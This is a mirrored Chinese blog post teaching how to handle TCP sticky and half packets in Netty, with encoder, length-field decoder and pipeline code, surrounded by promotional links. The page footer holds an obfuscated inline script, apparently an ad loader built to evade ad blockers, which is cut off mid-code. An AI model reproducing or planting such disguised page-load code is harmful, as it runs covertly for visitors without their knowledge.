<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Netty 粘包 拆包  | 史上最全解读 - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Netty 粘包 拆包  | 史上最全解读" />
<meta property="og:description" content="文章很长，建议收藏起来，慢慢读! 疯狂创客圈为小伙伴奉上以下珍贵的学习资源：
疯狂创客圈 经典图书 ： 《Netty Zookeeper Redis 高并发实战》 面试必备 &#43; 大厂必备 &#43; 涨薪必备疯狂创客圈 经典图书 ： 《SpringCloud、Nginx高并发核心编程》 面试必备 &#43; 大厂必备 &#43; 涨薪必备疯狂创客圈 价值1000元 百度网盘资源大礼包 随便取 GO-&gt;【博客园总入口 】独孤九剑 Netty灵魂实验 ： 本地 100W连接 高并发实验，瞬间提升Java内力 文章目录 价值连城：2021春招月薪过5万 面试题 系列万字长文： 疯狂创客圈 springCloud 高并发系列写在前面 什么是粘包和半包？粘包和半包 图解半包的实验粘包和半包更全实验粘包和半包原理拆包的原理Netty 中的拆包器拆包之前的消息包装开发一个接收端的自定义拆包器自定义拆包器的实际应用为什么拆包器要加在pipeline 的最前面写在最后疯狂创客圈 实战计划 价值连城：2021春招月薪过5万 面试题 系列 搞定下面这些面试题，2021春招月薪过5万(猛！)阿里、京东、美团、头条… 随意挑、横着走！！！Java基础1： JVM面试题（史上最强、持续更新、吐血推荐）https://www.cnblogs.com/crazymakercircle/p/14365820.html2：Java基础面试题（史上最全、持续更新、吐血推荐）https://www.cnblogs.com/crazymakercircle/p/14366081.html3：死锁面试题（史上最强、持续更新）[https://www.cnblogs.com/crazymakercircle/p/14323919.html]4：设计模式面试题 （史上最全、持续更新、吐血推荐）https://www.cnblogs.com/crazymakercircle/p/14367101.html5：架构设计面试题 （史上最全、持续更新、吐血推荐）https://www.cnblogs.com/crazymakercircle/p/14367907.html还有 10 几篇 篇价值连城 的面试题具体… 请参见【 疯狂创客圈 高并发 总目录 】 万字长文： 疯狂创客圈 springCloud 高并发系列 springCloud 高质量 博文 nacos 实战（史上最全） sentinel （史上最全&#43;入门教程） springcloud &#43; webflux 高并发实战 Webflux（史上最全） SpringCloud gateway （史上最全）还有 10 几篇 万字长文 的高质量 博文具体… 请参见【 疯狂创客圈 高并发 总目录 】 写在前面 大家好，我是作者尼恩。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bchobby.github.io/posts/ed7fba6a429b9ba6e32296a5767023cc/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2018-11-11T11:36:18+08:00" />
<meta property="article:modified_time" content="2018-11-11T11:36:18+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Netty 粘包 拆包  | 史上最全解读</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>文章很长，建议收藏起来，慢慢读! <a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"><strong>疯狂创客圈</strong></a>为小伙伴奉上以下珍贵的学习资源：</p> 
<ul><li><strong>疯狂创客圈 经典图书 ： <a href="https://www.cnblogs.com/crazymakercircle/p/11397271.html" rel="nofollow">《Netty Zookeeper Redis 高并发实战》</a> 面试必备 + 大厂必备 + 涨薪必备</strong></li><li><strong>疯狂创客圈 经典图书 ： <a href="https://www.cnblogs.com/crazymakercircle/p/13878143.html" rel="nofollow">《SpringCloud、Nginx高并发核心编程》</a> 面试必备 + 大厂必备 + 涨薪必备</strong></li><li>疯狂创客圈 价值1000元 百度网盘资源大礼包 <strong>随便取</strong> GO-&gt;【<a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"><strong>博客园总入口</strong></a> 】</li><li>独孤九剑 <a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"><strong>Netty灵魂实验</strong></a> ： 本地 <strong>100W连接</strong> 高并发实验，<a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"><strong>瞬间提升Java内力</strong></a></li></ul> 
<hr> 
<p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><ul><li><a href="#20215___12" rel="nofollow">价值连城：2021春招月薪过5万 面试题 系列</a></li><li><a href="#__springCloud___25" rel="nofollow">万字长文： 疯狂创客圈 springCloud 高并发系列</a></li><li><ul><li><a href="#_37" rel="nofollow">写在前面</a></li></ul> 
   </li><li><a href="#_57" rel="nofollow">什么是粘包和半包？</a></li><li><a href="#__106" rel="nofollow">粘包和半包 图解</a></li><li><a href="#_121" rel="nofollow">半包的实验</a></li><li><a href="#_168" rel="nofollow">粘包和半包更全实验</a></li><li><a href="#_196" rel="nofollow">粘包和半包原理</a></li><li><a href="#_222" rel="nofollow">拆包的原理</a></li><li><a href="#Netty__242" rel="nofollow">Netty 中的拆包器</a></li><li><a href="#_282" rel="nofollow">拆包之前的消息包装</a></li><li><a href="#_345" rel="nofollow">开发一个接收端的自定义拆包器</a></li><li><a href="#_414" rel="nofollow">自定义拆包器的实际应用</a></li><li><a href="#pipeline__448" rel="nofollow">为什么拆包器要加在pipeline 的最前面</a></li><li><a href="#_486" rel="nofollow">写在最后</a></li><li><ul><li><ul><li><ul><li><ul><li><a href="#__500" rel="nofollow">疯狂创客圈 实战计划</a></li></ul> 
     </li></ul> 
    </li></ul> 
   </li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<hr> 
<h3><a id="20215___12"></a>价值连城：2021春招月薪过5万 面试题 系列</h3> 
<table><thead><tr><th align="left">搞定下面这些面试题，2021春招月薪过5万(猛！)</th><th>阿里、京东、美团、头条… 随意挑、横着走！！！</th></tr></thead><tbody><tr><td align="left"><strong>Java基础</strong></td><td></td></tr><tr><td align="left">1： JVM面试题（史上最强、持续更新、吐血推荐）</td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14365820.html" rel="nofollow">https://www.cnblogs.com/crazymakercircle/p/14365820.html</a></td></tr><tr><td align="left">2：Java基础面试题（史上最全、持续更新、吐血推荐）</td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14366081.html" rel="nofollow">https://www.cnblogs.com/crazymakercircle/p/14366081.html</a></td></tr><tr><td align="left">3：死锁面试题（史上最强、持续更新）</td><td>[https://www.cnblogs.com/crazymakercircle/p/14323919.html]</td></tr><tr><td align="left">4：设计模式面试题 （史上最全、持续更新、吐血推荐）</td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14367101.html" rel="nofollow">https://www.cnblogs.com/crazymakercircle/p/14367101.html</a></td></tr><tr><td align="left">5：架构设计面试题 （史上最全、持续更新、吐血推荐）</td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14367907.html" rel="nofollow">https://www.cnblogs.com/crazymakercircle/p/14367907.html</a></td></tr><tr><td align="left">还有 <strong>10 几篇</strong> 篇<strong>价值连城</strong> 的面试题</td><td>具体… 请参见【<a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"> 疯狂创客圈 高并发 总目录</a> 】</td></tr></tbody></table> 
<hr> 
<h3><a id="__springCloud___25"></a>万字长文： 疯狂创客圈 springCloud 高并发系列</h3> 
<table><thead><tr><th align="left">springCloud 高质量 博文</th><th></th></tr></thead><tbody><tr><td align="left"><a href="https://www.cnblogs.com/crazymakercircle/p/14231815.html" rel="nofollow"> nacos 实战（史上最全）</a></td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14285001.html" rel="nofollow"> sentinel （史上最全+入门教程）</a></td></tr><tr><td align="left"><a href="https://www.cnblogs.com/crazymakercircle/p/14312282.html" rel="nofollow"> springcloud + webflux 高并发实战</a></td><td><a href="https://www.cnblogs.com/crazymakercircle/p/14302151.html" rel="nofollow"> Webflux（史上最全）</a></td></tr><tr><td align="left"><a href="https://www.cnblogs.com/crazymakercircle/p/11704077.html" rel="nofollow"> SpringCloud gateway （史上最全）</a></td><td></td></tr><tr><td align="left">还有 <strong>10 几篇</strong> 万字长文 的高质量 博文</td><td>具体… 请参见【<a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"> 疯狂创客圈 高并发 总目录</a> 】</td></tr></tbody></table> 
<hr> 
<h4><a id="_37"></a>写在前面</h4> 
<p>大家好，我是作者尼恩。</p> 
<p>为了完成了一个高性能的 Java 聊天程序，在前面的文章中，尼恩已经再一次的进行了通讯协议的重新选择。</p> 
<p>这就是：<strong>放弃了大家非常熟悉的json 格式，选择了性能更佳的 Protobuf协议</strong>。</p> 
<p>在上一篇文章中，并且完成了Netty 和 Protobuf协议整合实战。</p> 
<p>具体的文章为： <a href="https://www.cnblogs.com/crazymakercircle/p/9926534.html" rel="nofollow">Netty+Protobuf 整合一：实战案例，带源码</a></p> 
<p>另外，专门开出一篇文章，介绍了通讯消息数据包的几条设计准则。</p> 
<p>具体的文章为： <a href="https://www.cnblogs.com/crazymakercircle/p/9937026.html" rel="nofollow">Netty +Protobuf 整合二：protobuf 消息通讯协议设计的几个准则</a></p> 
<p><strong>在开始聊天器实战开发之前，还有一个非常基础的问题，需要解决：这就是通讯的粘包和半包问题。</strong></p> 
<h3><a id="_57"></a>什么是粘包和半包？</h3> 
<p><strong>先从数据包的发送和接收开始讲起。</strong></p> 
<p>我们知道， Netty 发送和读取数据的单位，可以形象的使用 ByteBuf 来充当。</p> 
<p>每一次发送，就是向Channel 写入一个 ByteBuf ；每一次读取，就是从 Channel 读到一个 ByteBuf 。</p> 
<p>发送一次数据，举例如下：</p> 
<pre><code>channel.writeAndFlush(buffer);
</code></pre> 
<p>读取一次数据，举例如下：</p> 
<pre><code>public void channelRead(ChannelHandlerContext ctx, Object msg)
{
		ByteBuf byteBuf = (ByteBuf) msg;
   //....
}

</code></pre> 
<p><strong>我们的理想是：发送端每发送一个buffer，接收端就能接收到一个一模一样的buffer。</strong></p> 
<p>然而，理想很丰满，现实很骨感。</p> 
<p>在实际的通讯过程中，并没有大家预料的那么完美。</p> 
<p>一种意料之外的情况，如期而至。这就是粘包和半包。</p> 
<p>那么，什么是粘包和半包？</p> 
<p><strong>粘包和半包定义如下：</strong></p> 
<ol><li> <p>粘包和半包，指的都不是一次是正常的 ByteBuf 缓存区接收。</p> </li><li> <p>粘包，就是接收端读取的时候，多个发送过来的 ByteBuf “粘”在了一起。</p> <p>换句话说，接收端读取一次的 ByteBuf ，读到了多个发送端的 ByteBuf ，是为粘包。</p> </li><li> <p>半包，就是接收端将一个发送端的ByteBuf “拆”开了，形成一个破碎的包，我们定义这种 ByteBuf 为半包。</p> <p>换句话说，接收端读取一次的 ByteBuf ，读到了发送端的一个 ByteBuf的一部分，是为半包。</p> </li></ol> 
<h3><a id="__106"></a>粘包和半包 图解</h3> 
<p>上面的理论比较抽象，下面用一幅图来形象说明。</p> 
<p>下图中，发送端发出4个数据包，接受端也接受到了4个数据包。但是，通讯过程中，接收端出现了 粘包和半包。<br> <img src="https://images2.imgbox.com/8a/2c/DdAzYovB_o.png" alt="在这里插入图片描述"></p> 
<p>接收端收到的第一个包，正常。</p> 
<p>接收端收到的第二个包，就是一个粘包。 将发送端的第二个包、第三个包，粘在一起了。</p> 
<p>接收端收到的第三个包，第四个包，就是半包。将发送端的的第四个包，分开成了两个了。</p> 
<h3><a id="_121"></a>半包的实验</h3> 
<p>由于在前文 <a href="https://www.cnblogs.com/crazymakercircle/p/9926534.html" rel="nofollow">Netty+Protobuf 整合一：实战案例，带源码</a> 的源码中，没有看到异常的现象。是因为代码屏蔽了半包的输出，所以看到的都是正常的数据包。</p> 
<p>稍微调整一下，在前文解码器的代码，加上半包的提示信息输出，就可以看到半包的提示。</p> 
<p>示意图如下：<br> <img src="https://images2.imgbox.com/7c/d7/vTnwcMHa_o.png" alt="在这里插入图片描述"></p> 
<p>调整过的半包警告的代码，如下：</p> 
<pre><code>/**
 * 解码器
 * 
 */
public class ProtobufDecoder extends ByteToMessageDecoder {
    //....
   protected void decode(ChannelHandlerContext ctx, ByteBuf in,
         List&lt;Object&gt; out) throws Exception {
      //...

      // 读取传送过来的消息的长度。
      int length = in.readUnsignedShort();

      //...
      if (length &gt; in.readableBytes()) {
         // 读到的半包
         // ...
         LOG.error("告警：读到的消息体长度小于传送过来的消息长度");
         return;
      }
     //...  省略了正常包的处理
   }
}
</code></pre> 
<p>具体的源码，请参见<strong>本文的源码工程</strong>：<a href="https://download.csdn.net/download/crazymakercircle/10777415">Netty 粘包/半包原理与拆包实战 源码 </a></p> 
<p>源码中，客户端向服务器循环发了1000个数据包，服务器接收端，出现了很多的半包的场景。</p> 
<p>可以下载源码，进行实验。</p> 
<p>实验时，服务器端运行 ChatServerApp 的main方法，客户端运行 ChatClientApp 的main方法，就可以看到上面图片中所示的半包的结果。</p> 
<h3><a id="_168"></a>粘包和半包更全实验</h3> 
<p>上面的实例，只能看到半包的结果，看不到粘包的结果。</p> 
<p>为了看到粘包的场景，这里，不使用protobuf 协议，直接使用缓冲区进行读写通讯，设计了一个的简单的演示实验案例。</p> 
<p>案例已经设计好，可以下载源码，进行实验。</p> 
<p>运行实例，不仅可以看到半包的提示信息输出，而且可以看到粘包的提示信息输出，示意图如下：</p> 
<p><img src="https://images2.imgbox.com/9a/f1/aTTC8Ltd_o.png" alt="在这里插入图片描述"></p> 
<p>我们可以看到，服务器收到的数据包，有包含多个发送端数据包的，这就是粘包了。</p> 
<p>另外，接收端还有出现乱码的数据包，就是只包含部分发送端数据，这就是半包了。</p> 
<p>这个实例的源码，直接简化了前面的基于Protobuf协议通讯的实例源码。代码的逻辑结构，是一样的。</p> 
<p>源码中，客户端向服务器循环发了1000个数据包，服务器接收端，收到数据包，直接在屏幕输出。</p> 
<p>服务器端运行：DemoServerApp 的main方法，客户端运行 DemoClientApp的main方法，就可以看到上面图片中所示的半包的结果。</p> 
<p>本实验的具体的源码，还是请参见<strong>本文的源码工程</strong>：<a href="https://download.csdn.net/download/crazymakercircle/10777415">Netty 粘包/半包原理与拆包实战 源码 </a></p> 
<h3><a id="_196"></a>粘包和半包原理</h3> 
<p>这得从底层说起。</p> 
<p>在操作系统层面来说，我们使用了 TCP 协议。</p> 
<p>在Netty的应用层，按照 ByteBuf 为 单位来发送数据，但是到了底层操作系统仍然是按照字节流发送数据，因此，从底层到应用层，需要进行<strong>二次拼装</strong>。</p> 
<p>操作系统底层，是按照字节流的方式读入，到了 Netty 应用层面，需要二次拼装成 ByteBuf。</p> 
<p>这就是粘包和半包的根源。</p> 
<p>在Netty 层面，拼装成ByteBuf时，就是对底层缓冲的读取，这里就有问题了。</p> 
<p>首先，上层应用层每次读取底层缓冲的数据容量是有限制的，当TCP底层缓冲数据包比较大时，将被分成多次读取，造成断包，在应用层来说，就是半包。</p> 
<p>其次，如果上层应用层一次读到多个底层缓冲数据包，就是粘包。</p> 
<p><strong>如何解决呢？</strong></p> 
<p>基本思路是，在接收端，需要根据自定义协议来，来读取底层的数据包，重新组装我们应用层的数据包，这个过程通常在接收端称为<strong>拆包</strong>。</p> 
<h3><a id="_222"></a>拆包的原理</h3> 
<p>拆包基本原理，简单来说：</p> 
<ul><li> <p>接收端应用层不断从底层的TCP 缓冲区中读取数据。</p> </li><li> <p>每次读取完，判断一下是否为一个完整的应用层数据包。如果是，上层应用层数据包读取完成。</p> </li><li> <p>如果不是，那就保留该数据在应用层缓冲区，然后继续从 TCP 缓冲区中读取，直到得到一个完整的应用层数据包为止。</p> </li><li> <p><strong>至此，半包问题得以解决</strong>。</p> </li><li> <p>如果从TCP底层读到了多个应用层数据包，则将整个应用层缓冲区，拆成一个一个的独立的应用层数据包，返回给调用程序。</p> </li><li> <p><strong>至此，粘包问题得以解决</strong>。</p> </li></ul> 
<h3><a id="Netty__242"></a>Netty 中的拆包器</h3> 
<p>拆包这个工作，Netty 已经为大家备好了很多不同的拆包器。本着不重复发明轮子的原则，我们直接使用Netty现成的拆包器。</p> 
<p>Netty 中的拆包器大致如下：</p> 
<ol><li> <p>固定长度的拆包器 FixedLengthFrameDecoder</p> <p>每个应用层数据包的都拆分成都是固定长度的大小，比如 1024字节。</p> <p>这个显然不大适应在 Java 聊天程序 进行实际应用。</p> </li><li> <p>行拆包器 LineBasedFrameDecoder</p> <p>每个应用层数据包，都以换行符作为分隔符，进行分割拆分。</p> <p>这个显然不大适应在 Java 聊天程序 进行实际应用。</p> </li><li> <p>分隔符拆包器 DelimiterBasedFrameDecoder</p> <p>每个应用层数据包，都通过自定义的分隔符，进行分割拆分。</p> <p>这个版本，是LineBasedFrameDecoder 的通用版本，本质上是一样的。</p> <p>这个显然不大适应在 Java 聊天程序 进行实际应用。</p> </li><li> <p>基于数据包长度的拆包器 LengthFieldBasedFrameDecoder</p> <p>将应用层数据包的长度，作为接收端应用层数据包的拆分依据。按照应用层数据包的大小，拆包。这个拆包器，有一个要求，就是应用层协议中包含数据包的长度。</p> <p>这个显然比较适和在 Java 聊天程序 进行实际应用。下面我们来应用这个拆分器。</p> </li></ol> 
<h3><a id="_282"></a>拆包之前的消息包装</h3> 
<p>在使用LengthFieldBasedFrameDecoder 拆包器之前 ，<strong>在发送端需要对protobuf 的消息包进行一轮包装</strong>。</p> 
<p><strong>发送端包装的方法是：</strong></p> 
<p>在实际的protobuf 二进制消息包的前面，加上四个字节。</p> 
<p>前两个字节为版本号，后两个字节为实际发送的 protobuf 的消息长度。</p> 
<p><img src="https://images2.imgbox.com/6b/19/aFDoA0Ul_o.png" alt="在这里插入图片描述"></p> 
<p>强调一下，二进制消息包装，在发送端进行。</p> 
<p>修改发送端的编码器 ProtobufEncoder ，代码如下：</p> 
<pre><code>/**
 * 编码器
 */
public class ProtobufEncoder extends MessageToByteEncoder&lt;ProtoMsg.Message&gt;
{
   
    @Override
    protected void encode(ChannelHandlerContext ctx, ProtoMsg.Message msg, ByteBuf out)
            throws Exception
    {

        byte[] bytes = msg.toByteArray();// 将对象转换为byte
        int length = bytes.length;// 读取 ProtoMsg 消息的长度
        ByteBuf buf = Unpooled.buffer(2 + length);
        // 先将消息协议的版本写入，也就是消息头
        buf.writeShort(Constants.PROTOCOL_VERSION);
        // 再将 ProtoMsg 消息的长度写入
        buf.writeShort(length);
        // 写入 ProtoMsg 消息的消息体
        buf.writeBytes(bytes);
        //发送
        out.writeBytes(buf);

    }

}
</code></pre> 
<p>发送端的步骤是：</p> 
<ul><li>先将消息协议的版本写入，也就是消息头</li></ul> 
<p>​ buf.writeShort(Constants.PROTOCOL_VERSION);</p> 
<ul><li> <p>再将 ProtoMsg 消息的长度写入<br> buf.writeShort(length);</p> </li><li> <p>最后，写入 ProtoMsg 消息的消息体<br> buf.writeBytes(bytes);</p> </li></ul> 
<h3><a id="_345"></a>开发一个接收端的自定义拆包器</h3> 
<p>使用Netty中，基于长度域拆包器 LengthFieldBasedFrameDecoder，按照实际的应用层数据包长度来拆分。</p> 
<p>需要做两个工作：</p> 
<ul><li>设置长度信息（长度域）在数据包中的位置。</li><li>设置长度信息（长度域）自身的长度，也就是占用的字节数。</li></ul> 
<p>在前面的小节中，我们的长度信息（长度域）的占用字节数为 2个字节； 在报文中的所处的位置，长度信息（长度域）处于版本号之后。</p> 
<p>版本号是2个字节，从0开始数，长度信息（长度域）的在数据包中的位置为2。</p> 
<p>这些数据定义在Constansts常量类中。</p> 
<pre><code>public class Constants
{
    //协议版本号
    public static final short PROTOCOL_VERSION = 1;
    //头部的长度： 版本号 + 报文长度
    public static final short PROTOCOL_HEADLENGTH = 4;
    //长度的偏移
    public static final short LENGTH_OFFSET = 2;
    //长度的字节数
    public static final short LENGTH_BYTES_COUNT = 2;

}
</code></pre> 
<p>有了这些数据之后，可以基于Netty 的长度拆包器 LengthFieldBasedFrameDecoder， 开发自己的长度分割器。</p> 
<p>新开发的分割器为PackageSpliter，代码如下：</p> 
<pre><code>package com.crazymakercircle.chat.common.codec;


public class PackageSpliter extends LengthFieldBasedFrameDecoder
{

    public PackageSpliter() {
        super(Integer.MAX_VALUE, Constants.LENGTH_OFFSET,Constants.LENGTH_BYTES_COUNT);
    }

    @Override
    protected Object decode(ChannelHandlerContext ctx, ByteBuf in) throws Exception {

        return super.decode(ctx, in);
    }
}
</code></pre> 
<p>分割器 PackageSpliter 继承了 LengthFieldBasedFrameDecoder，传入了三个参数。</p> 
<ul><li>长度的偏移量 ，这里是 Constants.LENGTH_OFFSET，值为 2</li><li>长度的字节数，这里是 Constants.LENGTH_BYTES_COUNT，值为 2</li><li>最大的应用包长度，这里是 Integer.MAX_VALUE，表示不限制</li></ul> 
<p>分割器 写好之后，只需要在 pipeline 的最前面加上这个分割器，就可以使用这个分割器（自定义的拆包器）。</p> 
<h3><a id="_414"></a>自定义拆包器的实际应用</h3> 
<p>在服务器端的 pipeline 的最前面加上这个分割器，代码如下：</p> 
<pre><code>package com.crazymakercircle.chat.server;
//...

@Service("ChatServer")
public class ChatServer
{
    static final Logger LOGGER = LoggerFactory.getLogger(ChatServer.class);
      //...
                //有连接到达时会创建一个channel
                protected void initChannel(SocketChannel ch) throws Exception
                {   //应用自定义拆包器
                    ch.pipeline().addLast(new PackageSpliter());
                    ch.pipeline().addLast(new ProtobufDecoder());
                    ch.pipeline().addLast(new ProtobufEncoder());
                    // pipeline管理channel中的Handler
                    // 在channel队列中添加一个handler来处理业务
                    ch.pipeline().addLast("serverHandler", serverHandler);
                }
            });
//....
}
</code></pre> 
<p>在发送端的 pipeline 的最前面加上这个分割器，代码也是类似的， 这里不再赘述。大家可以下载源码查看。</p> 
<h3><a id="pipeline__448"></a>为什么拆包器要加在pipeline 的最前面</h3> 
<p>这一点，需要从PackageSpliter 的根源讲起。</p> 
<p>下面是自定义分割器 PackageSpliter 的继承关系图。</p> 
<p><img src="https://images2.imgbox.com/1c/a8/WNLeMvPS_o.png" alt="在这里插入图片描述"></p> 
<p>由此可见，分割器 PackageSpliter 继承了ChannelInboundHandlerAdapter。</p> 
<p><strong>本质上，它是一个入站处理器</strong>。</p> 
<p>在 关于Netty的入站处理流程一文 <a href="https://www.cnblogs.com/crazymakercircle/p/9868218.html" rel="nofollow">Pipeline inbound</a> 中， 我们已经知道，Netty的入站处理的顺序，是从pipelin 流水线的前面到后面。</p> 
<p>由于在入站过程中，解码器 ProtobufDecoder 进行应用层 protobuf 的数据包的解码，而在此之前，必须完成应用包的正确分割。</p> 
<p>所以， 分割器 PackageSpliter 必须处于入站流水线处理的第一站，放在最前面。</p> 
<p><strong>题外话， PackageSpliter 分割器 和 ProtobufEncoder 编码器 是否有关系呢？</strong></p> 
<p>从流水线处理的角度来说，是没有次序关系的。</p> 
<p>PackageSpliter 是入站处理器。 在入站流程中用到。</p> 
<p>ProtobufEncoder 是出站处理器，在出站流程中用到。</p> 
<p>特别提示一下： 发送端不存在粘包和半包问题。这是接收端的事情。</p> 
<p>总之，在出站和入站处理流程上，分割器 PackageSpliter 和 编码器ProtobufEncoder , 没有半毛钱关系的。</p> 
<h3><a id="_486"></a>写在最后</h3> 
<p>至此为止，终于完成了 Java 聊天程序【 亿级流量】实战的一些基础开发工作。</p> 
<p>包括了协议的编码解码。包括了粘包和半包的拆包处理。</p> 
<p>大家好，我是作者尼恩。 为大家预告一下接下来的工作：</p> 
<p>下一步，基本上可以开始[ 疯狂创客圈 IM] 聊天器的正式设计和开发的详细讲解了。</p> 
<hr> 
<h6><a id="__500"></a>疯狂创客圈 实战计划</h6> 
<ul><li><strong>Java (Netty) 聊天程序【 亿级流量】实战 开源项目实战</strong></li></ul> 
<ul><li><strong>Netty 源码、原理、JAVA NIO 原理</strong></li><li><strong>Java 面试题 一网打尽</strong></li><li>疯狂创客圈 <a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"><strong>【 博客园 总入口 】</strong></a></li></ul> 
<hr>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/fe876cf49f32e98f96e1bb0c99c58b7a/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">抽象类和接口的区别</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/cb6360d90057a683a58cfac395ceb41f/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">OI退役记</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 